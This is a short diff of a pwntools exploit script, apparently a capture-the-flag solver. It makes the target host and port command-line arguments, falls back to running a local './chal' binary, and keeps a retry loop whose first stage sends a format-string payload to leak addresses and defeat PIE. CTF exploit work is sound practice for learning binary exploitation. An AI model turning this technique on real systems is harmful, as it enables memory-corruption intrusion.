@@ -26,11 +26,17 @@ S, nums2 = find_seed()
 log.info(f'S = {S}')
 log.info(f'nums2 = {[hex(v) for v in nums2]}')
 
-PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 40918
+HOST = sys.argv[1] if len(sys.argv) > 1 else None
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None
+
+def start():
+    if HOST and PORT:
+        return remote(HOST, PORT)
+    return process('./chal')
 
 for attempt in range(30):
     try:
-        p = remote('10.21.232.223', PORT)
+        p = start()
 
         # Stage 1: PIE leak
         p.sendline(b'A'*44 + b'%13$p')
